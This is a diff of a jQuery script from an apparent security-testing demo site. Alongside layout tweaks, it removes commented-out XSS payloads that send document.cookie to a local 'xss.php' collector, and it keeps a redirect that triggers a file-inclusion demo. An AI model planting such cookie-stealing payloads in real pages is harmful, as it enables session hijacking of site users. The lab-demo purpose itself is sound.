@@ -1,6 +1,19 @@
 $(document).ready(function(){
+	//console.log($(".fp-tableCell:has(.mysection)"));
 
     $('#fullpage').fullpage();
+	
+	
+	var i=0;
+	$(".fp-tableCell:has(.mysection)").css("vertical-align", "inherit");
+	
+	/*each(function(){
+		console.log("toto" + i);
+		console.log($(this));
+		if(i == 0)
+			$(this).addClass("fp-tableCell-First");
+		i++;
+	});*/
 
     $(".dropdown").click(function(){	
         var mdi = $(this).find(".mdi");
@@ -16,17 +29,6 @@ $(document).ready(function(){
         $(this).next(".radio-group").slideToggle();
     });
 
-    /* XSS Attack - Put malicious JS in login input 
-    $('input[type=radio][name=attack]').change(function() {
-        switch(this.value){
-            case 'xss-attack' :
-                $("#loginWithoutSecurity").val("window.open(\"http://127.0.0.1/securitytesting/xssattack/xss.php?c=\"+document.cookie);");
-                break;
-        }
-    });*/
-
-/* window.location="http://127.0.0.1/securitytesting/xssattack/xss.php?c="+document.cookie; */
-    
     $('#cb-dic').change(function() {
         if($(this).is(":checked")){
             $("#passwordWithoutSecurity").addClass("protected");
@@ -86,11 +88,11 @@ $(document).ready(function(){
 });
 
 function submitCheck(){
-    if($("#rb-include").is(":checked")){
-        window.location = "http://127.0.0.1/securitytesting/?includeattack=1";
-        return false;
-    }
-
+	if($("#rb-include").is(":checked")){
+		window.location = "/index.php/?includeattack=1";
+		return false;
+	}
+	
     if($("#submitWithoutSecurity").hasClass("disabled"))
         return false;
     
